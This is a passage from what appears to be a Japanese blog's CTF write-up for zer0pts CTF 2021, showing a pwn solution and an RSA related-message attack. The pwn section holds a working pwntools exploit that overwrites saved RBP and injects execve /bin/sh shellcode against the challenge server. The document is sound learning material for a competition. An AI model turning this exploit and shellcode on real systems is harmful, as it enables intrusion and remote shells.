+  40019c:   00 aa 01 40 00 
+  4001a1:   ff 04 25 2e 02 60 00    inc    DWORD PTR ds:0x60022e
+  4001a8:   eb 59                   jmp    400203 &lt;write&gt;
+
+00000000004001aa &lt;..@8.return_address&gt;:
+  4001aa:   ba 00 10 00 00          mov    edx,0x1000
+  4001af:   48 8d b5 00 ff ff ff    lea    rsi,[rbp-0x100]
+  4001b6:   31 ff                   xor    edi,edi
+  4001b8:   8b 0c 25 2e 02 60 00    mov    ecx,DWORD PTR ds:0x60022e
+  4001bf:   48 c7 04 cd 34 02 60    mov    QWORD PTR [rcx*8+0x600234],0x4001d4
+  4001c6:   00 d4 01 40 00 
+  4001cb:   ff 04 25 2e 02 60 00    inc    DWORD PTR ds:0x60022e
+  4001d2:   eb 16                   jmp    4001ea &lt;read&gt;
+
+00000000004001d4 &lt;..@9.return_address&gt;:
+  4001d4:   c9                      leave  
+  4001d5:   ff 0c 25 2e 02 60 00    dec    DWORD PTR ds:0x60022e
+  4001dc:   8b 0c 25 2e 02 60 00    mov    ecx,DWORD PTR ds:0x60022e
+  4001e3:   ff 24 cd 34 02 60 00    jmp    QWORD PTR [rcx*8+0x600234]
+
+00000000004001ea &lt;read&gt;:
+  4001ea:   31 c0                   xor    eax,eax
+  4001ec:   0f 05                   syscall 
+  4001ee:   ff 0c 25 2e 02 60 00    dec    DWORD PTR ds:0x60022e
+  4001f5:   8b 0c 25 2e 02 60 00    mov    ecx,DWORD PTR ds:0x60022e
+  4001fc:   ff 24 cd 34 02 60 00    jmp    QWORD PTR [rcx*8+0x600234]
+
+0000000000400203 &lt;write&gt;:
+  400203:   31 c0                   xor    eax,eax
+  400205:   ff c0                   inc    eax
+  400207:   0f 05                   syscall 
+  400209:   ff 0c 25 2e 02 60 00    dec    DWORD PTR ds:0x60022e
+  400210:   8b 0c 25 2e 02 60 00    mov    ecx,DWORD PTR ds:0x60022e
+  400217:   ff 24 cd 34 02 60 00    jmp    QWORD PTR [rcx*8+0x600234]
+
+000000000040021e &lt;exit&gt;:
+  40021e:   b8 3c 00 00 00          mov    eax,0x3c
+  400223:   0f 05                   syscall 
+</code></pre></div>
+</details>
+
+<p><code>vuln</code> を呼び出して 0x1000 文字読み込んだ後、<code>notvuln</code> を呼び出して 0x100 文字読み込むというプログラムです。</p>
+<p>0x100 文字のバッファに 0x1000 文字読み込む単純な Buffer Over Flow が起きているのは明らかです。しかし、残念ながら大量に入力しても Segmentation Fault にはなりません。どうやら単純な ROP は出来なさそうです。</p>
+<p>と言うのも、objdump の結果を見てみると、<code>ret</code> の文字がありません。なんてこった！ 手掛かりを探るため、gdb で動的解析をしてみます。</p>
+<p><img alt="gdb" src="gdb.png" /></p>
+<p>早速 <code>notvuln</code> の読み込み部分で気になる所が。読み込み先である第二引数のアドレスが、<code>vuln</code> で入力した値に含まれるっぽい...? これはつまり、<strong>任意のアドレスに任意の値を代入できる</strong> という事を意味します。</p>
+<div class="highlight"><pre><span></span><code>  40013d:   48 8d b5 00 ff ff ff    lea    rsi,[rbp-0x100]
+</code></pre></div>
+<p>もう少し詳しく解析すると、</p>
+<ul>
+<li><code>vuln</code> での入力から <code>notvuln</code> の <code>rbp</code> までのオフセットは 0x100（正確には、<code>vuln</code> の <code>saved rbp</code>）</li>
+<li>第二引数になる <code>rsi</code> は <code>rbp</code> - 0x100　→　つまり、入力したいアドレス + 0x100 を <code>rbp</code> にすれば良い</li>
+</ul>
+<p>という事が分かります。では、どこに何を入れれば <code>rip</code> を奪取できるかを考えてみましょう。</p>
+<p><img alt="gdb2" src="gdb2.png" /></p>
+<p>これは、プログラムが <code>exit</code> で終了する直前の様子です。0x600234 + <code>rcx</code> * 8 、つまり 0x60023C から <code>rip</code> を読み込んでジャンプしています。そして、<strong>0x60023c は writable &amp; excutable</strong> です。</p>
+<div class="highlight"><pre><span></span><code>00400000-00401000 r-xp 00000000 08:07 14683508                           /home/defineprogram/Desktop/CTF/zer0ptsCTF2021/pwn/not beginner/not_beginners_stack/chall
+00600000-00601000 rwxp 00000000 08:07 14683508                           /home/defineprogram/Desktop/CTF/zer0ptsCTF2021/pwn/not beginner/not_beginners_stack/chall
+7ffff7ffb000-7ffff7ffe000 r--p 00000000 00:00 0                          [vvar]
+7ffff7ffe000-7ffff7fff000 r-xp 00000000 00:00 0                          [vdso]
+7ffffffde000-7ffffffff000 rwxp 00000000 00:00 0                          [stack]
+ffffffffff600000-ffffffffff601000 --xp 00000000 00:00 0                  [vsyscall]
+</code></pre></div>
+<p>という事は、スタックの状態を以下のようにするとシェルを取れそうです！</p>
+<ul>
+<li>0x60023c : 0x60023c + 0x8 = 0x600244 (シェルコードのアドレス)</li>
+<li>0x600244 : shellcode</li>
+</ul>
+<p>このようにすると、<code>jmp    QWORD PTR [rcx*8+0x600234]</code> で <code>rip</code> に 0x600244 がセットされ、シェルコードが実行されます！</p>
+<details>
+<summary>Exploit Code</summary>
+
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">elf</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./chall&quot;</span><span class="p">)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&quot;pwn.ctf.zer0pts.com&quot;</span><span class="p">,</span> <span class="mi">9011</span><span class="p">)</span>
+
+<span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">256</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x60023c</span><span class="o">+</span><span class="mh">0x100</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Data: &quot;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x600244</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x99\x0f\x05</span><span class="s2">&quot;</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;Data: &quot;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+</details>
+
+<p>FLAG : <code>zer0pts{1nt3rm3d14t3_pwn3r5_l1k3_2_0v3rwr1t3_s4v3d_RBP}</code></p>
+<p>解くのに 1 時間くらい掛かってしまいました。</p>
+<h2 id="crypto-warsamup">[crypto] war(sa)mup<a class="headerlink" href="#crypto-warsamup" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>Do you know RSA? I know.</p>
+</blockquote>
+<p>セグメント木を知っていますか？僕は知っています。（定形文）</p>
+<p>さて、重要な部分を抜粋すると以下です。</p>
+<div class="highlight"><pre><span></span><code><span class="n">m</span> <span class="o">=</span> <span class="n">pad</span><span class="p">(</span><span class="nb">int</span><span class="o">.</span><span class="n">from_bytes</span><span class="p">(</span><span class="n">flag</span><span class="p">,</span> <span class="s2">&quot;big&quot;</span><span class="p">),</span> <span class="n">n</span><span class="p">)</span>
+<span class="n">c1</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">m</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+<span class="n">c2</span> <span class="o">=</span> <span class="nb">pow</span><span class="p">(</span><span class="n">m</span> <span class="o">//</span> <span class="mi">2</span><span class="p">,</span> <span class="n">e</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;n =&quot;</span><span class="p">,</span> <span class="n">n</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;e =&quot;</span><span class="p">,</span> <span class="n">e</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;c1=&quot;</span><span class="p">,</span> <span class="n">c1</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="s2">&quot;c2=&quot;</span><span class="p">,</span> <span class="n">c2</span><span class="p">)</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>n = 113135121314210337963205879392132245927891839184264376753001919135175107917692925687745642532400388405294058068119159052072165971868084999879938794441059047830758789602416617241611903275905693635535414333219575299357763227902178212895661490423647330568988131820052060534245914478223222846644042189866538583089
+e = 1337
+c1= 89077537464844217317838714274752275745737299140754457809311043026310485657525465380612019060271624958745477080123105341040804682893638929826256518881725504468857309066477953222053834586118046524148078925441309323863670353080908506037906892365564379678072687516738199061826782744188465569562164042809701387515
+c2= 18316499600532548540200088385321489533551929653850367414045951501351666430044325649693237350325761799191454032916563398349042002392547617043109953849020374952672554986583214658990393359680155263435896743098100256476711085394564818470798155739552647869415576747325109152123993105242982918456613831667423815762
+</code></pre></div>
+<p><code>m//2</code> が気になりますね。もし <span class="arithmatex">\(m\)</span> が <span class="arithmatex">\(2\)</span> で割り切れるなら </p>
+<div class="arithmatex">\[
+(m/2)^e\ mod\ n \equiv \frac{m^e}{2^e}\ mod\ n
+\]</div>
+<p>ですから、これに <span class="arithmatex">\(2^e\)</span> を掛けた値と <code>c1</code> は一致するはずです。逆に、割り切れない場合は <span class="arithmatex">\(2^e\)</span> を掛けた値は </p>
+<div class="arithmatex">\[
+(m-1)^e\ mod\ n
+\]</div>
+<p>となるはずです。実際に計算すると、<span class="arithmatex">\(2^e\)</span> を掛けた値は <code>c1</code> と一致しません。つまり、以下の値が判明します。</p>
+<ul>
+<li><span class="arithmatex">\(m^e\ mod\ n\)</span></li>
+<li><span class="arithmatex">\((m-1)^e\ mod\ n\)</span></li>
+</ul>
+<p>平文が非常に近いですね。こういう時に使える攻撃手法がないかな〜と思って調べると、<a href="https://hackmd.io/@Xornet/B16W75IND">Related Message Attack の記事</a> がヒットしました。</p>
+<p>理解は後日する事にして（最悪）、sage math のスクリプトがあるのでコピペして（最悪 2）ちょっと改変すると、FLAG が表示されました！</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">hexlify</span><span class="p">,</span> <span class="n">unhexlify</span>
+<span class="kn">from</span> <span class="nn">string</span> <span class="kn">import</span> <span class="n">printable</span>
+
+
+<span class="k">def</span> <span class="nf">str_to_num</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="k">return</span> <span class="nb">int</span><span class="p">(</span><span class="n">hexlify</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">num_to_str</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
+    <span class="n">hexed</span> <span class="o">=</span> <span class="nb">hex</span><span class="p">(</span><span class="n">s</span><span class="p">)[</span><span class="mi">2</span><span class="p">:]</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">hexed</span><span class="p">)</span> <span class="o">%</span> <span class="mi">2</span> <span class="o">==</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">hexed</span> <span class="o">=</span> <span class="s2">&quot;0&quot;</span> <span class="o">+</span> <span class="n">hexed</span>
+    <span class="k">return</span> <span class="n">unhexlify</span><span class="p">(</span><span class="n">hexed</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">gcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+    <span class="k">while</span> <span class="n">b</span><span class="p">:</span>
+        <span class="n">a</span><span class="p">,</span> <span class="n">b</span> <span class="o">=</span> <span class="n">b</span><span class="p">,</span> <span class="n">a</span> <span class="o">%</span> <span class="n">b</span>
+    <span class="k">return</span> <span class="n">a</span><span class="o">.</span><span class="n">monic</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">franklinreiter</span><span class="p">(</span><span class="n">c_1</span><span class="p">,</span> <span class="n">c_2</span><span class="p">,</span> <span class="n">e_1</span><span class="p">,</span> <span class="n">e_2</span><span class="p">,</span> <span class="n">N</span><span class="p">,</span> <span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
+    <span class="n">P</span><span class="o">.&lt;</span><span class="n">X</span><span class="o">&gt;</span> <span class="o">=</span> <span class="n">PolynomialRing</span><span class="p">(</span><span class="n">Zmod</span><span class="p">(</span><span class="n">N</span><span class="p">))</span>
+    <span class="n">g_1</span> <span class="o">=</span> <span class="n">X</span><span class="o">^</span><span class="n">e_1</span> <span class="o">-</span> <span class="n">c_1</span>
+    <span class="n">g_2</span> <span class="o">=</span> <span class="p">(</span><span class="n">a</span><span class="o">*</span><span class="n">X</span> <span class="o">+</span> <span class="n">b</span><span class="p">)</span><span class="o">^</span><span class="n">e_2</span> <span class="o">-</span> <span class="n">c_2</span>
+    <span class="c1"># get constant term</span>
+    <span class="n">result</span> <span class="o">=</span> <span class="o">-</span><span class="n">gcd</span><span class="p">(</span><span class="n">g_1</span><span class="p">,</span> <span class="n">g_2</span><span class="p">)</span><span class="o">.</span><span class="n">coefficients</span><span class="p">()[</span><span class="mi">0</span><span class="p">]</span>
+
+    <span class="k">return</span> <span class="n">result</span>
+
+<span class="n">n</span> <span class="o">=</span> <span class="mi">113135121314210337963205879392132245927891839184264376753001919135175107917692925687745642532400388405294058068119159052072165971868084999879938794441059047830758789602416617241611903275905693635535414333219575299357763227902178212895661490423647330568988131820052060534245914478223222846644042189866538583089</span>
+<span class="n">e</span> <span class="o">=</span> <span class="mi">1337</span>
+<span class="n">c1</span><span class="o">=</span> <span class="mi">89077537464844217317838714274752275745737299140754457809311043026310485657525465380612019060271624958745477080123105341040804682893638929826256518881725504468857309066477953222053834586118046524148078925441309323863670353080908506037906892365564379678072687516738199061826782744188465569562164042809701387515</span>
+<span class="n">c2</span><span class="o">=</span> <span class="mi">18316499600532548540200088385321489533551929653850367414045951501351666430044325649693237350325761799191454032916563398349042002392547617043109953849020374952672554986583214658990393359680155263435896743098100256476711085394564818470798155739552647869415576747325109152123993105242982918456613831667423815762</span>
+<span class="n">c3</span><span class="o">=</span><span class="n">c2</span><span class="o">*</span><span class="nb">pow</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">n</span><span class="p">)</span><span class="o">%</span><span class="n">n</span>
+
+<span class="n">plain</span><span class="o">=</span><span class="n">num_to_str</span><span class="p">(</span><span class="n">franklinreiter</span><span class="p">(</span><span class="n">c1</span><span class="p">,</span><span class="n">c3</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">e</span><span class="p">,</span><span class="n">n</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="o">-</span><span class="mi">1</span><span class="p">))</span>
+<span class="nb">print</span><span class="p">(</span><span class="n">plain</span><span class="p">)</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code>b&#39;\x02\x81\xae\xed \xdd\x07\x12;\x99\xc7d:\x99\x1a8\x16\xfe\xe6&lt;\x18\x1dw\xea&amp;\xfb\xfc\x8a\xa7\xa8\xba\xfa\xd8\xbe\xdf\x01\x13\xcb\xd3\x99\x9c\xf3_\x18qw\xb99}\&#39;Q\xd7~\x03&amp;^\xcd\x9aw\xf0\xef\xb5\x04\x1b\xb7\n\xe1\xcd&quot;\x95ff]\x0c(H\x99\xb5\xed\xc3\x82\x9dl\xe4\x8c\xddx\xfd\x00zer0pts{y0u_g07_47_13457_0v3r_1_p0in7}&#39;
+</code></pre></div>
+<p>FLAG : <code>zer0pts{y0u_g07_47_13457_0v3r_1_p0in7}</code></p>
+<h2 id="_3">おしまい<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>い　か　が　で　し　た　か　？　笑</p>
+<p>最近は CTF に傾倒しがちですが、そろそろ競プロも復帰しようと思っています。多分もう 2 ヶ月くらい rated 参加してないので... ← 引退か？</p>
+<p>取り敢えず、残り 2 日間の期末を乗り越えるぞ！！（なお、破滅確定）</p>
+                
+                  
+                    
+
+<hr>
+<div class="md-source-date">
+  <small>
+    
+      最終更新日: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">2021年3月15日</span>
+    
+  </small>
+</div>
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../modctf-2021/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  前
+                </span>
+                防衛省 CTF 参加記
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../0x41414141-pwn/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  次
+                </span>
+                0x41414141 CTF Writeup (pwn only)
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+  <div class="md-footer-social">
+    
+      
+      
+        
+        
+      
+      <a href="https://github.com/ret2home/" target="_blank" rel="noopener" title="github.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://twitter.com/ret2home" target="_blank" rel="noopener" title="twitter.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+      </a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/vendor.6a3d08fc.min.js"></script>
+      <script src="../../assets/javascripts/bundle.71201edf.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u30af\u30ea\u30c3\u30d7\u30dc\u30fc\u30c9\u3078\u30b3\u30d4\u30fc", "clipboard.copied": "\u30b3\u30d4\u30fc\u3057\u307e\u3057\u305f", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\s\\-\u3000\u3001\u3002\uff0c\uff0e]+", "search.placeholder": "\u691c\u7d22", "search.result.placeholder": "\u691c\u7d22\u30ad\u30fc\u30ef\u30fc\u30c9\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044", "search.result.none": "\u4f55\u3082\u898b\u3064\u304b\u308a\u307e\u305b\u3093\u3067\u3057\u305f", "search.result.one": "1\u4ef6\u898b\u3064\u304b\u308a\u307e\u3057\u305f", "search.result.other": "#\u4ef6\u898b\u3064\u304b\u308a\u307e\u3057\u305f", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../..",
+          features: ['navigation.tabs'],
+          search: Object.assign({
+            worker: "../../assets/javascripts/worker/search.4ac00218.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+        <script src="../../javascripts/config.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
